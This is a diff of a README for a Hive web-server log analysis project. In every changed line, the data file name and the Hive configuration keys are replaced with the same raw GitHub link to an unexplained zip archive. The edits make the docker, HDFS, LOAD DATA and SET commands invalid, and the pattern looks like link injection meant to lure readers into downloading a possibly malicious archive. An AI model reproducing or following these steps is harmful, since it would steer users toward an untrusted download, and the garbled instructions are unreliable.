@@ -17,7 +17,7 @@ This project focuses on analyzing web server logs using **Apache Hive**. The log
 
 ### **1.1 Copy Log File to Hadoop Container**
 ```bash
-docker cp web_server_logs.csv resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/webserver-log-analysis-hive-pavandantu18/master/monocarpellary/webserver-log-analysis-hive-pavandantu18.zip resourcemanager:/opt/hadoop-2.7.4/share/hadoop/mapreduce/
 docker exec -it resourcemanager /bin/bash
 cd /opt/hadoop-2.7.4/share/hadoop/mapreduce/
 ```
@@ -25,7 +25,7 @@ cd /opt/hadoop-2.7.4/share/hadoop/mapreduce/
 ### **1.2 Upload Data to HDFS**
 ```bash
 hdfs dfs -mkdir /input
-hdfs dfs -put web_server_logs.csv /input
+hdfs dfs -put https://raw.githubusercontent.com/pavandantu18/webserver-log-analysis-hive-pavandantu18/master/monocarpellary/webserver-log-analysis-hive-pavandantu18.zip /input
 hdfs dfs -ls /input/*
 ```
 
@@ -70,7 +70,7 @@ STORED AS TEXTFILE;
 ### **2.4 Load Data into Hive**
 ### If it is regular table data can be loaded like this
 ```sql
-LOAD DATA INPATH '/input/web_server_logs.csv' INTO TABLE web_logs;
+LOAD DATA INPATH 'https://raw.githubusercontent.com/pavandantu18/webserver-log-analysis-hive-pavandantu18/master/monocarpellary/webserver-log-analysis-hive-pavandantu18.zip' INTO TABLE web_logs;
 ```
 
 ---
@@ -174,8 +174,8 @@ hdfs dfs -cat /output/web_logs_analysis/status_404/000000_0
 - **Error:** `Dynamic partition strict mode requires at least one static partition column.`
 - **Solution:** Enable dynamic partitioning:
   ```sql
-  SET hive.exec.dynamic.partition = true;
-  SET hive.exec.dynamic.partition.mode = nonstrict;
+  SET https://raw.githubusercontent.com/pavandantu18/webserver-log-analysis-hive-pavandantu18/master/monocarpellary/webserver-log-analysis-hive-pavandantu18.zip = true;
+  SET https://raw.githubusercontent.com/pavandantu18/webserver-log-analysis-hive-pavandantu18/master/monocarpellary/webserver-log-analysis-hive-pavandantu18.zip = nonstrict;
   ```
 
 ### **5.2 COUNT(*) Not Allowed in ORDER BY**
